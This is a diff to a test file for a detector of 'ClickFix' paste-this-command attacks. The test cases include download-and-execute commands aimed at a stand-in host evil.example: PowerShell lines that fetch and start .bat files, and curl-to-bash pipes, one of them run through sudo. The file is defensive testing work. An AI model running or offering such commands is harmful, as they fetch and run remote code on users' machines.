@@ -47,6 +47,7 @@ describe("ClickFix command detector", () => {
     expect(clickFixTier('powershell -c "Invoke-WebRequest -Uri https://evil.example/d.bat -OutFile $env:TEMP\\d.bat; Start-Process $env:TEMP\\d.bat"')).toBe("weak");
     expect(clickFixTier('powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://evil.example/cv.bat -OutFile $env:TEMP\\cv.bat; Start-Process $env:TEMP\\cv.bat"')).toBe("strong");
     expect(clickFixTier("curl -s https://evil.example/p | nohup bash")).toBe("weak");
+    expect(clickFixTier("curl -s https://evil.example/p | sudo nohup bash")).toBeNull();
     expect(clickFixTier(`${"a".repeat(20_000)}\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)).toBe("weak");
   });
 
